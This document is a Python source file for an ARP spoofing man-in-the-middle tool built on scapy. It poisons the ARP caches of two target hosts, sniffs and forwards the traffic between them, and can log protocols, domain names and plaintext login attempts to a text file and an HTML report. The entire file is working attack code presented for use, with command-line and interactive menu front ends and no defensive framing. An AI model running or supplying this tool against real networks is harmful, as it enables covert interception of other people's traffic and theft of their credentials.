#!/usr/bin/env python3
# ARP Spoofing (Man-in-the-middle)

import argparse
from scapy.all import *
from scapy.all import ARP
from scapy.all import IP
import time
import re
import threading
import sys

running = True

def arpSpoof(target, spoofIp, iface):
    pkt = ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoofIp)
    print(f"Sending ARP spoof packets to target {target}, impersonating {spoofIp}.")
    while running:
        send(pkt, iface=iface, verbose=False)
        time.sleep(1)

def forwardPacket(pkt, target1, target2, iface):
    if pkt.haslayer(IP):
        sendp(pkt, iface=iface, verbose=False)

def sniffAndForward(target1, target2, iface):
    print(f"Starting packet sniffing on {iface}")
    sniff(iface=iface, filter="ip", prn=lambda x: forwardPacket(x, target1, target2, iface), store=0, timeout=None)

def startAttack(target1, target2, iface, report):
    # Start ARP poisoning threads
    threading.Thread(target=arpSpoof, args=(target1, target2, iface), daemon=True).start()
    threading.Thread(target=arpSpoof, args=(target2, target1, iface), daemon=True).start()

    # Start sniffing and forwarding packets
    if report == 1:
        sniffThread = threading.Thread(target=createReport, args=(target1, target2, iface))
        sniffThread.start()
        sniffThread.join()  # Wait for sniffing and report generation to complete
    else:
        sniffAndForward(target1, target2, iface)

def createReport(target1, target2, iface):
    applicationPorts = {
        21: "FTP", 22: "SSH", 23: "Telnet",
        25: "SMTP", 53: "DNS", 67: "DHCP", 68: "DHCP",
        80: "HTTP", 443: "HTTPS", 110: "POP3",
        143: "IMAP", 389: "LDAP", 161: "SNMP",
        3306: "MySQL", 5432: "PostgreSQL"
    }

    protocolCount = {}
    domainSet = set()
    csvFilename = "sniffingData.txt"
    
    # Create CSV file and write header
    with open(csvFilename, "w") as csv_file:
        csv_file.write("Protocols,Packet Summary\n")

    def extractDomains(payload):
        pattern = r'(?i)\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b'
        return re.findall(pattern, payload)

    def getApplicationProtocol(packet):
        protocols = []

        if packet.haslayer(ICMP):
            protocols.append("ICMP")

        if packet.haslayer("TCP") or packet.haslayer("UDP"):
            sport = packet.sport
            dport = packet.dport
            if sport in applicationPorts:
                protocols.append(applicationPorts[sport])
            if dport in applicationPorts:
                protocols.append(applicationPorts[dport])

        if packet.haslayer("Raw"):
            payload = packet["Raw"].load.decode(errors="ignore").lower()
            domainsFound = extractDomains(payload)
            if domainsFound:
                for domain in domainsFound:
                    domainSet.add(domain)
            if any(method in payload for method in ["get ", "post ", "put ", "delete ", "host: "]):
                protocols.append("HTTP")
            if "tls" in payload or "ssl" in payload:
                protocols.append("TLS/SSL")
            if "220" in payload and "ftp" in payload:
                protocols.append("FTP")
            if "ehlo" in payload or "mail from" in payload:
                protocols.append("SMTP")
            if "user" in payload and "pass" in payload:
                protocols.append("Telnet/FTP Login")
            if "bind" in payload or "query" in payload:
                protocols.append("DNS Query")
            if "mysql_native_password" in payload or "handshake" in payload:
                protocols.append("MySQL")
            if "postgresql" in payload or "scram-sha-256" in payload:
                protocols.append("PostgreSQL")
            if "ldap" in payload or "bindrequest" in payload:
                protocols.append("LDAP")
            if "snmp" in payload or "community" in payload:
                protocols.append("SNMP")
            if "dhcp" in payload or "discover" in payload:
                protocols.append("DHCP")
            if "smb" in payload:
                protocols.append("SMB")
            if "rdp" in payload:
                protocols.append("RDP")
            if "sip:" in payload:
                protocols.append("SIP")

        return protocols

    def packetCallback(packet):
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            if not ((src == target1 and dst == target2) or (src == target2 and dst == target1)):
                return

        protocols = getApplicationProtocol(packet)
        if protocols:
            summary = packet.summary()
            msg = f"Application Layer Protocols: {protocols} | Packet Summary: {summary}"
            print(msg)

            with open(csvFilename, "a") as csv_file:
                csv_file.write(f"{'|'.join(protocols)},{summary}\n")

            for proto in protocols:
                protocolCount[proto] = protocolCount.get(proto, 0) + 1

    print(f"\nSniffing packets between {target1} and {target2} on interface {iface}... Press Ctrl+C to stop and create a report.")
    try:
        sniff(iface=iface, filter="ip", prn=packetCallback, store=False, timeout=None)
    except KeyboardInterrupt:
        print("\nStopping packet sniffing.")
        generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename)

def generateHtmlReport(target1, target2, iface, protocolCount, domainSet, csvFilename):
    htmlContent = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sniffing Report</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f4; }
    .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
    h1 { color: #333; }
    h2 { color: #555; border-bottom: 2px solid #ccc; padding-bottom: 5px; }
    ul { list-style-type: none; padding: 0; }
    li { padding: 5px 0; }
    .box { background: #f9f9f9; padding: 15px; border-radius: 5px; margin-top: 10px; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Sniffing Report for {target1} and {target2}</h1>
    <p><strong>Interface:</strong> {iface}</p>
    <div class="box">
      <h2>Protocol Counts</h2>
      <ul>
""".format(target1=target1, target2=target2, iface=iface)

    for proto, count in protocolCount.items():
        htmlContent += f"        <li>{proto}: {count}</li>\n"

    htmlContent += """      </ul>
    </div>
    <div class="box">
      <h2>Domains Found</h2>
      <ul>
"""
    if domainSet:
        for domain in domainSet:
            htmlContent += f"        <li>{domain}</li>\n"
    else:
        htmlContent += "        <li>No domains detected</li>\n"

    htmlContent += """      </ul>
    </div>
    <p>Raw sniffing data has been saved in <strong>{csvFilename}</strong></p>
  </div>
</body>
</html>
""".format(csvFilename=csvFilename)

    with open("report.html", "w") as html_file:
        html_file.write(htmlContent)
    print("HTML report generated: report.html")

def menu():
    target1 = input("Target 1 IP address: ")
    target2 = input("Target 2 IP address: ")
    interface = input("Interface: ")
    while True:
        report = input("Want to create a report during the attack? [Y]es | [N]o: ")
        if report.lower() == "y":
            startAttack(target1, target2, interface, 1)
        elif report.lower() == "n":
            startAttack(target1, target2, interface, 0)
            break
        else:
            print("Invalid.")

def terminal():
    parser = argparse.ArgumentParser(description="ARP Spoofing")
    parser.add_argument("-t1", "--target1", required=True, help="Target 1 IP address.")
    parser.add_argument("-t2", "--target2", required=True, help="Target 2 IP address.")
    parser.add_argument("-i", "--interface", required=True, help="Interface to use for the attack.")
    parser.add_argument("-r", "--report", action="store_true", help="Create a report.")

    args = parser.parse_args()

    if args.target1 and args.target2 and args.interface:
        if args.report:
            startAttack(args.target1, args.target2, args.interface, 1)
        else:
            startAttack(args.target1, args.target2, args.interface, 0)
    else:
        parser.error("Syntax error.")

def main():
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
